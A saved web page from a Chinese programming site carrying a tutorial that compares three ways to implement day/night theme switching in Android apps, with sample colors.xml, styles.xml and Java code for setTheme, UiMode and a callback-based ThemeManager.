@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="gb2312" />
+<meta name="applicable-device" content="pc">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<title>Android实现日夜间模式的深入理解_Android_脚本之家</title>
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+<meta name="keywords" content="android,夜间模式切换,android,夜间模式实现,android,夜间模式代码" />
+<meta name="description" content="相信Android的日间/夜间模式切换相信大家在平时使用 APP 的过程中都遇到过，比如知乎、简书中就有相关的模式切换。实现日间/夜间模式切换的方案也有许多种，趁着今天有空来讲一下日间/夜间模式切换的几种实现方案，也可以做一个横向的对比来看看哪种方案最好。" />
+<link rel="alternate" media="only screen and(max-width: 640px)" href="http://m.jb51.net/article/93852.htm" />
+<meta http-equiv="mobile-agent" content="format=html5; url=http://m.jb51.net/article/93852.htm" />
+<meta http-equiv="mobile-agent" content="format=xhtml; url=http://m.jb51.net/article/93852.htm" />
+<script type="text/javascript">
+var tougao="daisy";var lmname="Android";
+(function(){var reWriteUrl=function(url){if(url){var Splits=url.split("/"),siteName=window.location.pathname;if(typeof siteName!=="undefined"){return "http://m.jb51.net"+siteName}}};if(/Android|webOS|iPhone|iPad|Windows Phone|iPod|BlackBerry|SymbianOS|Nokia|Mobile/i.test(navigator.userAgent)){var url=window.location.href;var pathname=window.location.pathname;if(url.indexOf("?pc")<0){try{window.location.href=reWriteUrl(url)}catch(e){}}}})();
+</script>
+<link type="text/css" href="/skin/2016/base.css" rel="stylesheet" />
+<link type="text/css" href="/skin/2016/common.css" rel="stylesheet" />
+<script type="text/javascript" src="http://common.jb51.net/jslib/jquery/jquery.min.js"></script>
+<script type=text/javascript src="http://common.jb51.net/js/base.js"></script>
+</head>
+<body>
+<!--head Star -->
+<div id="head">
+  <div class="toolBar">
+  <div class="main">
+    <!--topNav Star -->
+    <div class="topNav clearfix">
+      <ul class="navList fl">
+        <li>
+          <div class="one"><a href="http://www.jb51.net" target="_blank">脚本之家</a></div>
+        </li>
+        <li>
+          <div class="one"><a href="http://www.jb51.net/softs/" target="_blank">软件下载<i class="icon"></i></a></div>
+          <div class="two">
+<a href="/softs/android.html" target="_blank">android软件</a> <a href="/softs/mac.html" target="_blank">MAC软件</a> <a href="/qudong/" target="_blank">驱动下载</a> <a href="/fonts/" target="_blank">字体下载</a> <a href="/dll/" target="_blank">DLL下载</a> </div>
+</li>
+        <li>
+          <div class="one"><a href="/codes/" target="_blank">源码下载<i class="icon"></i></a></div>
+          <div class="two"> <a href="/codes/asp.html" target="_blank">asp源码</a> <a href="/codes/php.html" target="_blank">php源码</a> <a href="/codes/aspnet.html" target="_blank">asp.net源码</a> <a href="/codes/jsp.html" target="_blank">jsp源码</a> <a href="/codes/editor.html" target="_blank">网页编辑器</a> <a href="/codes/list123_1.html" target="_blank">数据库管理</a> <a href="/codes/list124_1.html" target="_blank">常用组件</a> <a href="/jiaoben/" target="_blank">脚本下载</a></div>
+        </li>
+        <li>
+          <div class="one"><a href="http://tools.jb51.net" target="_blank">在线工具<i class="icon"></i></a></div>
+          <div class="two"> <a href="/shouce/" target="_blank">在线手册</a> <a href="/tools/cssyasuo.shtml" target="_blank">CSS格式化</a> <a href="http://tools.jb51.net/tools/js_geshihua.asp" target="_blank">JS格式化</a> <a href="/tools/html-js.htm" target="_blank">Html转化为Js</a> <a href="http://tools.jb51.net/regex/javascript" target="_blank">js正则表达式</a>
+</div>
+        </li>
+        <li>
+          <div class="one"><a href="/w3school/" target="_blank">网页教程基础</a></div>
+        </li>
+			<li>
+          <div class="one"><a href="http://s.jb51.net" target="_blank">服务器常用软件</a></div>
+        </li>
+		<li>
+          <div class="one"><a href="http://m.jb51.net" target="_blank">手机版</a></div>
+          <div class="two"><img src="http://files.jb51.net/images/m.jb51.net.png" data-baiduimageplus-ignore /></div>     
+        </li>
+        <li class="watch">
+          <div class="one"><a href="http://weibo.com/jb51net" target="_blank" rel="nofollow" ><i class="icon"></i>关注微信</a></div>
+          <div class="two"><img src="http://files.jb51.net/images/weixin_200.gif" data-baiduimageplus-ignore /></div>
+        </li>
+      </ul>
+      <div class="navUser mt5 fr" id="jb51_topbar" >
+
+      </div>
+    </div>
+    <!--topNav End -->
+  </div>
+</div>
+
+  <div class="main clearfix">
+    <div class="mtb10 clearfix">
+      <div class="logo"><a href="http://www.jb51.net/"><img src="http://www.jb51.net/images/logo.gif" title="脚本之家" alt="脚本之家" /></a></div>
+      <div class="logom fl"><span id="logo_m" class="jbTestPos"></span></div>
+      <div class="logor fr"><span id="logo_r" class="jbTestPos"></span></div>
+    </div>
+<!-- 导航-->
+<DIV class="nav_top clearfix">
+<UL>
+<li><a href="http://www.jb51.net/web/">网页制作</a></li>
+<li><a href="http://www.jb51.net/list/index_1.htm">网络编程</a></li>
+<li><a href="http://www.jb51.net/list/index_96.htm">脚本专栏</a></li>
+<li><a href="http://www.jb51.net/jiaoben/">脚本下载</a></li>
+<li><a href="http://www.jb51.net/list/index_104.htm">数据库</a></li>
+<li><a href="http://www.jb51.net/cms/">CMS教程</a></li>
+<li><a href="http://www.jb51.net/books/">电子书籍</a></li>
+<li><a href="http://www.jb51.net/pingmian/">平面设计</a></li>
+<li><a href="http://www.jb51.net/media/">媒体动画</a></li>
+<li><a href="http://www.jb51.net/os/">操作系统</a></li>
+<li><a href="http://www.jb51.net/yunying/">网站运营</a></li>
+<li><a href="http://www.jb51.net/hack/">网络安全</a></li>
+<li class="last"><a href="http://www.jb51.net/shouce/">在线手册</a></li>
+
+</UL>
+</DIV>
+
+<!--导航结束-->
+<div class="subnav clearfix">
+<ul><li><a href='/list/list_85_1.htm' title="C#教程">C#教程</a></li>
+<li><a href='/list/list_93_1.htm' title="vb">vb</a></li>
+<li><a href='/list/list_205_1.htm' title="vb.net">vb.net</a></li>
+<li><a href='/list/list_159_1.htm' title="C 语言">C 语言</a></li>
+<li><a href='/list/list_134_1.htm' title="Java编程">Java编程</a></li>
+<li><a href='/list/list_206_1.htm' title="Delphi">Delphi</a></li>
+<li><a href='/list/list_207_1.htm' title="java">java</a></li>
+<li><a href='/list/list_233_1.htm' title="Android">Android</a></li>
+<li><a href='/list/list_238_1.htm' title="IOS">IOS</a></li>
+<li><a href='/list/list_244_1.htm' title="Swift">Swift</a></li>
+<li><a href='/list/list_250_1.htm' title="Scala">Scala</a></li>
+<li><a href='/list/list_254_1.htm' title="易语言">易语言</a></li>
+<li><a href='/list/list_188_1.htm' title="其它相关">其它相关</a></li>
+</ul>
+</div>
+<div class="NavBar clearfix ptb10">
+<div class="fl w690">
+<div class="box mb15 mt10"><i class="icon"></i>您的位置：<a href='/'>首页</a> → <a href="/list/index_84.htm" title="软件编程">软件编程</a> → <a href="/list/list_233_1.htm" title="Android">Android</a> → 正文内容 Android实现日夜间模式</div>
+</div>
+<div class="fr w300"><div class="search">
+<form action="http://so.jb51.net/cse/search" target="_blank">
+    <input type="hidden" name="s" value="10520733385329581432">
+    <input type="hidden" name="ie" value="gbk">
+    <input type="text" name="q" class="key_input" placeholder="请输入关键词">
+    <input type="submit" value="搜索" class="c_btn">
+</form></div></div>
+  </div>
+</div>
+<!--head End -->
+<div class="main mb10 clearfix">
+<div class="clearfix"><span id="tonglan1" class="jbTestPos"></span></div>
+</div>
+
+<!--content Star -->
+<div id="contents">
+ <div class="main clearfix">
+      <div class="w690 fl">
+      <div class="article-content border">
+      <div class="title">
+            <h1 class="YaHei">Android实现日夜间模式的深入理解</h1>
+            <p>投稿：daisy  字体：[<a href="javascript:turnbig()">增加</a> <a href="javascript:turnsmall()">减小</a>] 类型：转载 时间：2016-09-30<a href="#comments"> 我要评论</a></p>
+        </div>
+        <div class="art_desc mt10"><div id="art_demo">相信Android的日间/夜间模式切换相信大家在平时使用 APP 的过程中都遇到过，比如知乎、简书中就有相关的模式切换。实现日间/夜间模式切换的方案也有许多种，趁着今天有空来讲一下日间/夜间模式切换的几种实现方案，也可以做一个横向的对比来看看哪种方案最好。</div></div>
+        <div class="lbd clearfix"><span id="art_up" class="jbTestPos"></span></div>
+        <div id="content">
+<p>在本篇文章中给出了三种实现日间/夜间模式切换的方案，三种方案综合起来可能导致文章的篇幅过长，请耐心阅读。</p>
+<p>&nbsp;&nbsp;&nbsp; 1、使用 <code>setTheme </code>的方法让 <code>Activity </code>重新设置主题；<br />
+</p>
+<p>&nbsp;&nbsp;&nbsp; 2、设置 <code>Android Support Library </code>中的 <code>UiMode </code>来支持日间/夜间模式的切换；<br />
+</p>
+<p>&nbsp;&nbsp;&nbsp; 3、通过资源 id 映射，回调自定义 <code>ThemeChangeListener </code>接口来处理日间/夜间模式的切换。<br />
+</p>
+<p><span style="color: #ff0000"><strong>一、使用 setTheme 方法</strong></span></p>
+<p>我们先来看看使用 <code>setTheme </code>方法来实现日间/夜间模式切换的方案。这种方案的思路很简单，就是在用户选择夜间模式时，Activity 设置成夜间模式的主题，之后再让 <code>Activity </code>调用 <code>recreate()</code> 方法重新创建一遍就行了。</p>
+<p>那就动手吧，在 colors.xml 中定义两组颜色，分别表示日间和夜间的主题色：</p>
+<div class="jb51code">
+<pre class="brush:java;">
+&lt;&#63;xml version="1.0" encoding="utf-8"&#63;&gt;
+&lt;resources&gt;
+ &lt;color name="colorPrimary"&gt;#3F51B5&lt;/color&gt;
+ &lt;color name="colorPrimaryDark"&gt;#303F9F&lt;/color&gt;
+ &lt;color name="colorAccent"&gt;#FF4081&lt;/color&gt;
+
+ &lt;color name="nightColorPrimary"&gt;#3b3b3b&lt;/color&gt;
+ &lt;color name="nightColorPrimaryDark"&gt;#383838&lt;/color&gt;
+ &lt;color name="nightColorAccent"&gt;#a72b55&lt;/color&gt;
+&lt;/resources&gt;</pre>
+</div>
+<p>之后在 styles.xml 中定义两组主题，也就是日间主题和夜间主题：</p>
+<div class="jb51code">
+<pre class="brush:xml;">
+&lt;resources&gt;
+
+ &lt;!-- Base application theme. --&gt;
+ &lt;style name="AppTheme" parent="Theme.AppCompat.Light.DarkActionBar"&gt;
+  &lt;!-- Customize your theme here. --&gt;
+  &lt;item name="colorPrimary"&gt;@color/colorPrimary&lt;/item&gt;
+  &lt;item name="colorPrimaryDark"&gt;@color/colorPrimaryDark&lt;/item&gt;
+  &lt;item name="colorAccent"&gt;@color/colorAccent&lt;/item&gt;
+  &lt;item name="android:textColor"&gt;@android:color/black&lt;/item&gt;
+  &lt;item name="mainBackground"&gt;@android:color/white&lt;/item&gt;
+ &lt;/style&gt;
+
+ &lt;style name="NightAppTheme" parent="Theme.AppCompat.Light.DarkActionBar"&gt;
+  &lt;!-- Customize your theme here. --&gt;
+  &lt;item name="colorPrimary"&gt;@color/nightColorPrimary&lt;/item&gt;
+  &lt;item name="colorPrimaryDark"&gt;@color/nightColorPrimaryDark&lt;/item&gt;
+  &lt;item name="colorAccent"&gt;@color/nightColorAccent&lt;/item&gt;
+  &lt;item name="android:textColor"&gt;@android:color/white&lt;/item&gt;
+  &lt;item name="mainBackground"&gt;@color/nightColorPrimaryDark&lt;/item&gt;
+ &lt;/style&gt;
+
+&lt;/resources&gt;</pre>
+</div>
+<p>在主题中的 <code>mainBackground </code>属性是我们自定义的属性，用来表示背景色：</p>
+<div class="jb51code">
+<pre class="brush:xml;">
+&lt;&#63;xml version="1.0" encoding="utf-8"&#63;&gt;
+&lt;resources&gt;
+ &lt;attr name="mainBackground" format="color|reference"&gt;&lt;/attr&gt;
+&lt;/resources&gt;</pre>
+</div>
+<p>接下来就是看一下布局 activity_main.xml：</p>
+<div class="jb51code">
+<pre class="brush:xml;">
+&lt;&#63;xml version="1.0" encoding="utf-8"&#63;&gt;
+&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+ xmlns:tools="http://schemas.android.com/tools"
+ android:layout_width="match_parent"
+ android:layout_height="match_parent"
+ android:background="&#63;attr/mainBackground"
+ android:paddingBottom="@dimen/activity_vertical_margin"
+ android:paddingLeft="@dimen/activity_horizontal_margin"
+ android:paddingRight="@dimen/activity_horizontal_margin"
+ android:paddingTop="@dimen/activity_vertical_margin"
+ tools:context="com.yuqirong.themedemo.MainActivity"&gt;
+
+ &lt;Button
+  android:id="@+id/btn_theme"
+  android:layout_width="match_parent"
+  android:layout_height="wrap_content"
+  android:text="切换日/夜间模式" /&gt;
+
+ &lt;TextView
+  android:id="@+id/tv"
+  android:layout_below="@id/btn_theme"
+  android:layout_width="match_parent"
+  android:layout_height="wrap_content"
+  android:gravity="center_horizontal"
+  android:text="通过setTheme()的方法" /&gt;
+
+&lt;/RelativeLayout&gt;</pre>
+</div>
+<p>在 &lt;RelativeLayout&gt; 的 <code>android:background </code>属性中，我们使用 "&#63;attr/mainBackground" 来表示，这样就代表着 <code>RelativeLayout </code>的背景色会去引用在主题中事先定义好的 <code>mainBackground </code>属性的值。这样就实现了日间/夜间模式切换的换色了。</p>
+<p>最后就是 <code>MainActivity </code>的代码：</p>
+<div class="jb51code">
+<pre class="brush:java;">
+public class MainActivity extends AppCompatActivity {
+
+ // 默认是日间模式
+ private int theme = R.style.AppTheme;
+
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+  super.onCreate(savedInstanceState);
+ // 判断是否有主题存储
+  if(savedInstanceState != null){
+   theme = savedInstanceState.getInt("theme");
+   setTheme(theme);
+  }
+  setContentView(R.layout.activity_main);
+
+  Button btn_theme = (Button) findViewById(R.id.btn_theme);
+  btn_theme.setOnClickListener(new View.OnClickListener() {
+   @Override
+   public void onClick(View v) {
+    theme = (theme == R.style.AppTheme) &#63; R.style.NightAppTheme : R.style.AppTheme;
+    MainActivity.this.recreate();
+   }
+  });
+ }
+
+ @Override
+ protected void onSaveInstanceState(Bundle outState) {
+  super.onSaveInstanceState(outState);
+  outState.putInt("theme", theme);
+ }
+
+ @Override
+ protected void onRestoreInstanceState(Bundle savedInstanceState) {
+  super.onRestoreInstanceState(savedInstanceState);
+  theme = savedInstanceState.getInt("theme");
+ }
+}</pre>
+</div>
+<p>在 <code>MainActivity </code>中有几点要注意一下：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 1、调用 <code>recreate() </code>方法后 Activity 的生命周期会调用 <code>onSaveInstanceState(Bundle outState)</code> 来备份相关的数据，之后也会调用 <code>onRestoreInstanceState(Bundle savedInstanceState)</code> 来还原相关的数据，因此我们把 <code>theme </code>的值保存进去，以便 Activity 重新创建后使用。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 2、我们在 <code>onCreate(Bundle savedInstanceState) </code>方法中还原得到了 <code>theme </code>值后，<code>setTheme() </code>方法一定要在 <code>setContentView() </code>方法之前调用，否则的话就看不到效果了。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 3、<code>recreate()</code> 方法是在 API 11 中添加进来的，所以在 Android 2.X 中使用会抛异常。</p>
+<p>贴完上面的代码之后，我们来看一下该方案实现的效果图：</p>
+<p style="text-align: center"><img alt="" src="http://files.jb51.net/file_images/article/201609/201693084031376.gif&#63;201683084044" /></p>
+<p><span style="color: #ff0000"><strong>二、使用 Android Support Library 中的 UiMode 方法</strong></span></p>
+<p>使用 UiMode 的方法也很简单，我们需要把 colors.xml 定义为日间/夜间两种。之后根据不同的模式会去选择不同的 colors.xml 。在 Activity 调用 <code>recreate() </code>之后，就实现了切换日/夜间模式的功能。</p>
+<p>说了这么多，直接上代码。下面是 values/colors.xml ：</p>
+<div class="jb51code">
+<pre class="brush:xml;">
+&lt;&#63;xml version="1.0" encoding="utf-8"&#63;&gt;
+&lt;resources&gt;
+ &lt;color name="colorPrimary"&gt;#3F51B5&lt;/color&gt;
+ &lt;color name="colorPrimaryDark"&gt;#303F9F&lt;/color&gt;
+ &lt;color name="colorAccent"&gt;#FF4081&lt;/color&gt;
+ &lt;color name="textColor"&gt;#FF000000&lt;/color&gt;
+ &lt;color name="backgroundColor"&gt;#FFFFFF&lt;/color&gt;
+&lt;/resources&gt;</pre>
+</div>
+<p>除了 values/colors.xml 之外，我们还要创建一个 values-night/colors.xml 文件，用来设置夜间模式的颜色，其中 &lt;color&gt; 的 name 必须要和 values/colors.xml 中的相对应：</p>
+<div class="jb51code">
+<pre class="brush:xml;">
+&lt;&#63;xml version="1.0" encoding="utf-8"&#63;&gt;
+&lt;resources&gt;
+ &lt;color name="colorPrimary"&gt;#3b3b3b&lt;/color&gt;
+ &lt;color name="colorPrimaryDark"&gt;#383838&lt;/color&gt;
+ &lt;color name="colorAccent"&gt;#a72b55&lt;/color&gt;
+ &lt;color name="textColor"&gt;#FFFFFF&lt;/color&gt;
+ &lt;color name="backgroundColor"&gt;#3b3b3b&lt;/color&gt;
+&lt;/resources&gt;</pre>
+</div>
+<p>在 styles.xml 中去引用我们在 colors.xml 中定义好的颜色：</p>
+<div class="jb51code">
+<pre class="brush:xml;">
+&lt;resources&gt;
+
+ &lt;!-- Base application theme. --&gt;
+ &lt;style name="AppTheme" parent="Theme.AppCompat.Light.DarkActionBar"&gt;
+  &lt;!-- Customize your theme here. --&gt;
+  &lt;item name="colorPrimary"&gt;@color/colorPrimary&lt;/item&gt;
+  &lt;item name="colorPrimaryDark"&gt;@color/colorPrimaryDark&lt;/item&gt;
+  &lt;item name="colorAccent"&gt;@color/colorAccent&lt;/item&gt;
+  &lt;item name="android:textColor"&gt;@color/textColor&lt;/item&gt;
+  &lt;item name="mainBackground"&gt;@color/backgroundColor&lt;/item&gt;
+ &lt;/style&gt;
+
+&lt;/resources&gt;</pre>
+</div>
+<p>activity_main.xml 布局的内容和上面 <code>setTheme() </code>方法中的相差无几，这里就不贴出来了。之后的事情就变得很简单了，在 MyApplication 中先选择一个默认的 Mode ：</p>
+<div class="jb51code">
+<pre class="brush:java;">
+public class MyApplication extends Application {
+
+ @Override
+ public void onCreate() {
+  super.onCreate();
+  // 默认设置为日间模式
+  AppCompatDelegate.setDefaultNightMode(
+    AppCompatDelegate.MODE_NIGHT_NO);
+ }
+
+}</pre>
+</div>
+<p>要注意的是，这里的 Mode 有四种类型可以选择：</p>
+<p>&nbsp;&nbsp;&nbsp; 1、MODE_NIGHT_NO： 使用亮色(light)主题，不使用夜间模式；<br />
+</p>
+<p>&nbsp;&nbsp;&nbsp; 2、MODE_NIGHT_YES：使用暗色(dark)主题，使用夜间模式；<br />
+</p>
+<p>&nbsp;&nbsp;&nbsp; 3、MODE_NIGHT_AUTO：根据当前时间自动切换 亮色(light)/暗色(dark)主题；<br />
+</p>
+<p>&nbsp;&nbsp;&nbsp; 4、MODE_NIGHT_FOLLOW_SYSTEM(默认选项)：设置为跟随系统，通常为 MODE_NIGHT_NO<br />
+</p>
+<p>当用户点击按钮切换日/夜间时，重新去设置相应的 Mode ：</p>
+<div class="jb51code">
+<pre class="brush:java;">
+public class MainActivity extends AppCompatActivity {
+
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+  super.onCreate(savedInstanceState);
+  setContentView(R.layout.activity_main);
+
+  Button btn_theme = (Button) findViewById(R.id.btn_theme);
+  btn_theme.setOnClickListener(new View.OnClickListener() {
+   @Override
+   public void onClick(View v) {
+    int currentNightMode = getResources().getConfiguration().uiMode & Configuration.UI_MODE_NIGHT_MASK;
+    getDelegate().setLocalNightMode(currentNightMode == Configuration.UI_MODE_NIGHT_NO
+      &#63; AppCompatDelegate.MODE_NIGHT_YES : AppCompatDelegate.MODE_NIGHT_NO);
+    // 同样需要调用recreate方法使之生效
+    recreate();
+   }
+  });
+ }
+
+}</pre>
+</div>
+<p>我们来看一下 <code>UiMode </code>方案实现的效果图：</p>
+<p style="text-align: center"><img alt="" src="http://files.jb51.net/file_images/article/201609/201693084228195.gif&#63;201683084243" /></p>
+<p>就前两种方法而言，配置比较简单，最后的实现效果也都基本上是一样的。但是缺点就是需要调用 <code>recreate()</code> 使之生效。而让 Activity 重新创建就必须涉及到一些状态的保存。这就增加了一些难度。所以，我们一起来看看第三种解决方法。</p>
+<p><span style="color: #ff0000"><strong>通过资源 id 映射，回调接口</strong></span></p>
+<p>第三种方法的思路就是根据设置的主题去动态地获取资源 id 的映射，然后使用回调接口的方式让 UI 去设置相关的属性值。我们在这里先规定一下：夜间模式的资源在命名上都要加上后缀 “_night” ，比如日间模式的背景色命名为 color_background ，那么相对应的夜间模式的背景资源就要命名为 color_background_night 。好了，下面就是我们的 Demo 所需要用到的 colors.xml ：</p>
+<div class="jb51code">
+<pre class="brush:xml;">
+&lt;&#63;xml version="1.0" encoding="utf-8"&#63;&gt;
+&lt;resources&gt;
+ 
+ &lt;color name="colorPrimary"&gt;#3F51B5&lt;/color&gt;
+ &lt;color name="colorPrimary_night"&gt;#3b3b3b&lt;/color&gt;
+ &lt;color name="colorPrimaryDark"&gt;#303F9F&lt;/color&gt;
+ &lt;color name="colorPrimaryDark_night"&gt;#383838&lt;/color&gt;
+ &lt;color name="colorAccent"&gt;#FF4081&lt;/color&gt;
+ &lt;color name="colorAccent_night"&gt;#a72b55&lt;/color&gt;
+ &lt;color name="textColor"&gt;#FF000000&lt;/color&gt;
+ &lt;color name="textColor_night"&gt;#FFFFFF&lt;/color&gt;
+ &lt;color name="backgroundColor"&gt;#FFFFFF&lt;/color&gt;
+ &lt;color name="backgroundColor_night"&gt;#3b3b3b&lt;/color&gt;
+ 
+&lt;/resources&gt;</pre>
+</div>
+<p>可以看到每一项 color 都会有对应的 “_night” 与之匹配。</p>
+<p>看到这里，肯定有人会问，为什么要设置对应的 “_night” ？到底是通过什么方式来设置日/夜间模式的呢？下面就由 ThemeManager 来为你解答：</p>
+<div class="jb51code">
+<pre class="brush:java;">
+public class ThemeManager {
+
+ // 默认是日间模式
+ private static ThemeMode mThemeMode = ThemeMode.DAY;
+ // 主题模式监听器
+ private static List&lt;OnThemeChangeListener&gt; mThemeChangeListenerList = new LinkedList&lt;&gt;();
+ // 夜间资源的缓存，key : 资源类型, 值&lt;key:资源名称, value:int值&gt;
+ private static HashMap&lt;String, HashMap&lt;String, Integer&gt;&gt; sCachedNightResrouces = new HashMap&lt;&gt;();
+ // 夜间模式资源的后缀，比如日件模式资源名为：R.color.activity_bg, 那么夜间模式就为 ：R.color.activity_bg_night
+ private static final String RESOURCE_SUFFIX = "_night";
+
+ /**
+  * 主题模式，分为日间模式和夜间模式
+  */
+ public enum ThemeMode {
+  DAY, NIGHT
+ }
+
+ /**
+  * 设置主题模式
+  *
+  * @param themeMode
+  */
+ public static void setThemeMode(ThemeMode themeMode) {
+  if (mThemeMode != themeMode) {
+   mThemeMode = themeMode;
+   if (mThemeChangeListenerList.size() &gt; 0) {
+    for (OnThemeChangeListener listener : mThemeChangeListenerList) {
+     listener.onThemeChanged();
+    }
+   }
+  }
+ }
+
+ /**
+  * 根据传入的日间模式的resId得到相应主题的resId，注意：必须是日间模式的resId
+  *
+  * @param dayResId 日间模式的resId
+  * @return 相应主题的resId，若为日间模式，则得到dayResId；反之夜间模式得到nightResId
+  */
+ public static int getCurrentThemeRes(Context context, int dayResId) {
+  if (getThemeMode() == ThemeMode.DAY) {
+   return dayResId;
+  }
+  // 资源名
+  String entryName = context.getResources().getResourceEntryName(dayResId);
+  // 资源类型
+  String typeName = context.getResources().getResourceTypeName(dayResId);
+  HashMap&lt;String, Integer&gt; cachedRes = sCachedNightResrouces.get(typeName);
+  // 先从缓存中去取，如果有直接返回该id
+  if (cachedRes == null) {
+   cachedRes = new HashMap&lt;&gt;();
+  }
+  Integer resId = cachedRes.get(entryName + RESOURCE_SUFFIX);
+  if (resId != null && resId != 0) {
+   return resId;
+  } else {
+   //如果缓存中没有再根据资源id去动态获取
+   try {
+    // 通过资源名，资源类型，包名得到资源int值
+    int nightResId = context.getResources().getIdentifier(entryName + RESOURCE_SUFFIX, typeName, context.getPackageName());
+    // 放入缓存中
+    cachedRes.put(entryName + RESOURCE_SUFFIX, nightResId);
+    sCachedNightResrouces.put(typeName, cachedRes);
+    return nightResId;
+   } catch (Resources.NotFoundException e) {
+    e.printStackTrace();
+   }
+  }
+  return 0;
+ }
+
+ /**
+  * 注册ThemeChangeListener
+  *
+  * @param listener
+  */
+ public static void registerThemeChangeListener(OnThemeChangeListener listener) {
+  if (!mThemeChangeListenerList.contains(listener)) {
+   mThemeChangeListenerList.add(listener);
+  }
+ }
+
+ /**
+  * 反注册ThemeChangeListener
+  *
+  * @param listener
+  */
+ public static void unregisterThemeChangeListener(OnThemeChangeListener listener) {
+  if (mThemeChangeListenerList.contains(listener)) {
+   mThemeChangeListenerList.remove(listener);
+  }
+ }
+
+ /**
+  * 得到主题模式
+  *
+  * @return
+  */
+ public static ThemeMode getThemeMode() {
+  return mThemeMode;
+ }
+
+ /**
+  * 主题模式切换监听器
+  */
+ public interface OnThemeChangeListener {
+  /**
+   * 主题切换时回调
+   */
+  void onThemeChanged();
+ }
+}</pre>
+</div>
+<p>上面 ThemeManager 的代码基本上都有注释，想要看懂并不困难。其中最核心的就是 <code>getCurrentThemeRes </code>方法了。在这里解释一下 <code>getCurrentThemeRes </code>的逻辑。参数中的 dayResId 是日间模式的资源id，如果当前主题是日间模式的话，就直接返回 dayResId 。反之当前主题为夜间模式的话，先根据 dayResId 得到资源名称和资源类型。比如现在有一个资源为 <code>R.color.colorPrimary</code> ，那么资源名称就是 colorPrimary ，资源类型就是 color 。然后根据资源类型和资源名称去获取缓存。如果没有缓存，那么就要动态获取资源了。这里使用方法的是</p>
+<div class="jb51code">
+<pre class="brush:java;">
+context.getResources().getIdentifier(String name, String defType, String defPackage)</pre>
+</div>
+<p>name 参数就是资源名称，不过要注意的是这里的资源名称还要加上后缀 “_night” ，也就是上面在 colors.xml 中定义的名称；<br />
+defType 参数就是资源的类型了。比如 color，drawable等；<br />
+</p>
+<p>defPackage 就是资源文件的包名，也就是当前 APP 的包名。<br />
+</p>
+<p>有了上面的这个方法，就可以通过 <code>R.color.colorPrimary</code> 资源找到对应的 <code>R.color.colorPrimary_night </code>资源了。最后还要把找到的夜间模式资源加入到缓存中。这样的话以后就直接去缓存中读取，而不用再次去动态查找资源 id 了。</p>
+<p>ThemeManager 中剩下的代码应该都是比较简单的，相信大家都可以看得懂了。</p>
+<p>现在我们来看看 MainActivity 的代码：</p>
+<div class="jb51code">
+<pre class="brush:java;">
+public class MainActivity extends AppCompatActivity implements ThemeManager.OnThemeChangeListener {
+
+ private TextView tv;
+ private Button btn_theme;
+ private RelativeLayout relativeLayout;
+ private ActionBar supportActionBar;
+
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+  super.onCreate(savedInstanceState);
+  setContentView(R.layout.activity_main);
+  ThemeManager.registerThemeChangeListener(this);
+  supportActionBar = getSupportActionBar();
+  btn_theme = (Button) findViewById(R.id.btn_theme);
+  relativeLayout = (RelativeLayout) findViewById(R.id.relativeLayout);
+  tv = (TextView) findViewById(R.id.tv);
+  btn_theme.setOnClickListener(new View.OnClickListener() {
+   @Override
+   public void onClick(View v) {
+    ThemeManager.setThemeMode(ThemeManager.getThemeMode() == ThemeManager.ThemeMode.DAY
+      &#63; ThemeManager.ThemeMode.NIGHT : ThemeManager.ThemeMode.DAY);
+   }
+  });
+ }
+
+ public void initTheme() {
+  tv.setTextColor(getResources().getColor(ThemeManager.getCurrentThemeRes(MainActivity.this, R.color.textColor)));
+  btn_theme.setTextColor(getResources().getColor(ThemeManager.getCurrentThemeRes(MainActivity.this, R.color.textColor)));
+  relativeLayout.setBackgroundColor(getResources().getColor(ThemeManager.getCurrentThemeRes(MainActivity.this, R.color.backgroundColor)));
+  // 设置标题栏颜色
+  if(supportActionBar != null){
+   supportActionBar.setBackgroundDrawable(new ColorDrawable(getResources().getColor(ThemeManager.getCurrentThemeRes(MainActivity.this, R.color.colorPrimary))));
+  }
+  // 设置状态栏颜色
+  if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) {
+   Window window = getWindow();
+   window.setStatusBarColor(getResources().getColor(ThemeManager.getCurrentThemeRes(MainActivity.this, R.color.colorPrimary)));
+  }
+ }
+
+ @Override
+ public void onThemeChanged() {
+  initTheme();
+ }
+
+ @Override
+ protected void onDestroy() {
+  super.onDestroy();
+  ThemeManager.unregisterThemeChangeListener(this);
+ }
+
+}</pre>
+</div>
+<p>在 MainActivity 中实现了 <code>OnThemeChangeListener </code>接口，这样就可以在主题改变的时候执行回调方法。然后在<code> initTheme() </code>中去重新设置 UI 的相关颜色属性值。还有别忘了要在 <code>onDestroy() </code>中移除 ThemeChangeListener 。</p>
+<p>最后就来看看第三种方法的效果吧：</p>
+<p style="text-align: center"><img alt="" src="http://files.jb51.net/file_images/article/201609/201693084414980.gif&#63;201683084423" /></p>
+<p>也许有人会说和前两种方法的效果没什么差异啊，但是仔细看就会发现前面两种方法在切换模式的瞬间会有短暂黑屏现象存在，而第三种方法没有。这是因为前两种方法都要调用 <code>recreate() </code>。而第三种方法不需要 Activity 重新创建，使用回调的方法来实现。</p>
+<p><span style="color: #ff0000"><strong>三个方法对比</strong></span></p>
+<p>到了这里，按照套路应该是要总结的时候了。那么就根据上面给的三种方法来一个简单的对比吧：</p>
+<p><code>setTheme </code>方法：可以配置多套主题，比较容易上手。除了日/夜间模式之外，还可以有其他五颜六色的主题。但是需要调用 <code>recreate()</code> ，切换瞬间会有黑屏闪现的现象；</p>
+<p><code>UiMode </code>方法：优点就是 Android Support Library 中已经支持，简单规范。但是也需要调用 <code>recreate() </code>，存在黑屏闪现的现象；</p>
+<p>动态获取资源 id ，回调接口：该方法使用起来比前两个方法复杂，另外在回调的方法中需要设置每一项 UI 相关的属性值。但是不需要调用 <code>recreate() </code>，没有黑屏闪现的现象。</p>
+<p><span style="color: #ff0000"><strong>总结</strong></span></p>
